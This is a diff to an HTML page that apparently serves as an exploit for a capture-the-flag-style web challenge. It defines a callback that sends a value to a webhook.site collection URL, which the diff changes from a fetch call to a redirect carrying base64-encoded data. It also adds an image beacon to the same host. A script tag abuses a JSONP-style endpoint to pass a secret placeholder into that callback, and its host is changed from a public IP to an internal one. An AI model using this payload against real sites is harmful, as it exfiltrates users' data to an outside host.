@@ -8,12 +8,13 @@
 </head>
 
 <body>
+    <img src='https://webhook.site/d51b43fc-d5ce-406c-a8f9-48d3e53aa0db/img1' />
     <script>
         window.applet = function callbackFunction(userData) {
-            fetch("https://webhook.site/d51b43fc-d5ce-406c-a8f9-48d3e53aa0db/"+userData);
+            window.location = "https://webhook.site/d51b43fc-d5ce-406c-a8f9-48d3e53aa0db/" + btoa(userData);
         }
     </script>
-    <script src="http://91.107.157.58:8000/?letter=window.applet(`$gift$`)&content_type=application/javascript"></script>
+    <script src="http://web:8000/?letter=window.applet(`$gift$`)&content_type=application/javascript"></script>
 </body>
 
 </html>
